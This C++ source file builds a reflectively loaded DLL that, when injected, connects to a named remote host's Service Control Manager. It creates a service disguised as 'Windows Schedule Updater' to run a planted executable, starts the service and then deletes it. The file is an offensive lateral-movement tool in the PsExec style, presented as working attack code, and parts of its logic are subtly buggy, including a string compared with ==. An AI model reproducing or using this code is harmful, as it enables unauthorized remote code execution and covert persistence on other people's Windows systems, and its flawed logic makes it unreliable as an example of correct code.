// dllmain.cpp : Defines the entry point for the DLL application.
// Reference - https://github.com/poweradminllc/PAExec
#include "ReflectiveLoader.h"
#include <windows.h>

SC_HANDLE sGetSCManager(char * sTarget)
{
	if (sTarget == "127.0.0.1")
		return OpenSCManagerA(NULL, NULL, 0xF003F);
	else
	return OpenSCManagerA(sTarget, NULL, SC_MANAGER_ALL_ACCESS);
}

SC_HANDLE sCreateService(SC_HANDLE hSCManager)
{
	return CreateServiceA(hSCManager, "Windows Schedule Updater", "Windows Schedule Updater", 0xF003F, 0x10, 0x3, 0x1, "\"C:\\Windows\\System32\\wschupdater.exe\"", NULL, NULL, NULL, NULL, NULL);
}																													  

void vCleanup(SC_HANDLE hSCManager, SC_HANDLE hSCService)
{
	if (CloseServiceHandle(hSCService) == 0)
	{
		printf("Service handle did not close correctly\n");	
		return;
	}

	if (CloseServiceHandle(hSCManager) == 0)
	{
		printf("Service manager handle did not close correctly\n");
		return;
	}

	printf("Clean up has finished\n");
	return;
}

void StartIT(LPVOID lpTarget)
{
	
	SC_HANDLE hSCManager;
	SC_HANDLE hSCService;
		
	if (strlen((char *)lpTarget) > 15)
	{
		printf("Something is up with your target\n");
		return;
	}

	hSCManager = sGetSCManager((char*)lpTarget);
	if (hSCManager != 0)
	{
		hSCService = sCreateService(hSCManager);
		if (hSCService != 0)
		{
			StartService(hSCService, NULL, NULL);
			Sleep(5000);
			DeleteService(hSCService);
			vCleanup(hSCManager, hSCService);
		}
		else
		{
			vCleanup(hSCManager, NULL);
		}
	}
	return;
}

extern "C" HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE *)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		if (lpReserved != NULL) {
			printf("Targeting '%s'\n", (char *)lpReserved);
		}
		else {
			printf("There is no parameter\n");
			break;
		}
		StartIT(lpReserved);
		fflush(stdout);
		//ExitProcess(0);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}

